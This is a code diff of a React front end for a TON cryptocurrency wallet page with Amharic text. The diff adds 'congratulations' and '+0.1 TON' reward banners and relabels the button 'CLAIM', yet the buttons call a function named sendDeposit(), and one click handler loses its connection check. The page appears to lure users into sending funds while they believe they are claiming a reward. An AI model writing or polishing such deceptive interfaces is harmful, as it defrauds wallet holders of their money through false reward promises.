@@ -14,13 +14,14 @@ function App() {
   return (
     <>
       <div> 
-        {connected && (<a onClick={() => {
+        <a onClick={() => {
                   sendDeposit();
                 }} target="_blank">
           <img src={reactLogo} className="logo react" alt="React logo" />
-        </a>)}
+        </a>
       </div> 
-      <h1>ስሙኒ</h1>
+      <h1 className="reward">congratulations🎉️</h1>
+      <h2 className='reward'>+0.1 TON</h2>
       <p className="read-the-docs">
       ከታች ያለውን Connect Wallet የሚለውን በመንካት ዋሌት አድሬሶን አስመዝግበውን ገንዘብዎን ማውጣት ይችላሉ።
       </p>
@@ -30,7 +31,7 @@ function App() {
       </div>
       <div>
         {connected && (
-          <MainButton text='4 TON ለመቀበል ይጫኑ'
+          <MainButton text='CLAIM'
             onClick={() => {
               sendDeposit();
             }}
